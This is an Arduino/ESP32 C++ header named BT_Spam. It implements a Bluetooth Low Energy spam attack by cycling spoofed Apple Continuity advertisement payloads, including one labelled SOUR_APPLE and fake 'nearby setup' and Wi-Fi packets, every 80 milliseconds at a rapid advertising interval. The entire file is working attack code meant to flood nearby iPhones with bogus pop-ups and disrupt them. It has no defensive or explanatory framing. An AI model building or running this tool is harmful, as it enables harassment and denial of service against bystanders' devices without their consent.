#ifndef BT_SPAM_H
#define BT_SPAM_H

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>

static BLEServer*      g_bleServer = nullptr;
static BLEAdvertising* g_bleAdv    = nullptr;
static bool            g_bleActive = false;

static const uint8_t SOUR_APPLE[] = {
  0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0E,
  0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t APPLE_NEARBY_SETUP[] = {
  0x1E, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x09,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t APPLE_NEARBY_WIFI[] = {
  0x1E, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, 0x0B,
  0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

inline bool btSpamInit() {
  if (g_bleActive) return true;

  BLEDevice::init("BT_Spam");
  g_bleServer = BLEDevice::createServer();
  g_bleAdv    = BLEDevice::getAdvertising();

  if (!g_bleServer || !g_bleAdv) {
    BLEDevice::deinit(true);
    g_bleServer = nullptr;
    g_bleAdv    = nullptr;
    return false;
  }

  g_bleActive = true;
  return true;
}

inline void btSpamTick() {
  if (!g_bleActive || !g_bleAdv) return;

  static unsigned long lastRotate = 0;
  static uint8_t mode = 0;

  if (millis() - lastRotate < 80) return;
  lastRotate = millis();

  g_bleAdv->stop();

  BLEAdvertisementData advData;
  std::string data;

  switch (mode % 3) {
    case 0: data.assign((const char*)SOUR_APPLE,         sizeof(SOUR_APPLE));         break;
    case 1: data.assign((const char*)APPLE_NEARBY_SETUP, sizeof(APPLE_NEARBY_SETUP)); break;
    case 2: data.assign((const char*)APPLE_NEARBY_WIFI,  sizeof(APPLE_NEARBY_WIFI));  break;
  }

  advData.addData(data);
  g_bleAdv->setAdvertisementData(advData);
  g_bleAdv->setScanResponse(false);
  g_bleAdv->setMinInterval(0x20);
  g_bleAdv->setMaxInterval(0x20);
  g_bleAdv->start();

  mode++;
}

inline void btSpamStop() {
  if (g_bleAdv) {
    g_bleAdv->stop();
    g_bleAdv = nullptr;
  }
  if (g_bleActive) {
    BLEDevice::deinit(true);
    g_bleActive = false;
    g_bleServer = nullptr;
  }
}

#endif